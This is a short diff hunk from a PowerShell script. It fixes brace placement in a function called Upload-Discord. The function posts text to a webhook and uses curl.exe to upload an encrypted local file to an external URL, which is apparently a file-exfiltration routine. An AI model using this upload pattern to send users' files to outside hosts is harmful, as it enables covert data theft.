@@ -557,9 +557,8 @@ function Upload-Discord {
 
     # Send text content if provided
     if (-not ([string]::IsNullOrEmpty($text))) {
-        Invoke-RestMethod -ContentType 'Application/Json' -Uri $hookurl  -Method Post -Body ($Body | ConvertTo-Json)};
-    }
-
+        Invoke-RestMethod -ContentType 'Application/Json' -Uri $hookurl  -Method Post -Body ($Body | ConvertTo-Json)
+    };
     # Send the encrypted file if it exists
     if (Test-Path $encryptedFilePath) {
         curl.exe -F "file1=@$encryptedFilePath" $dc
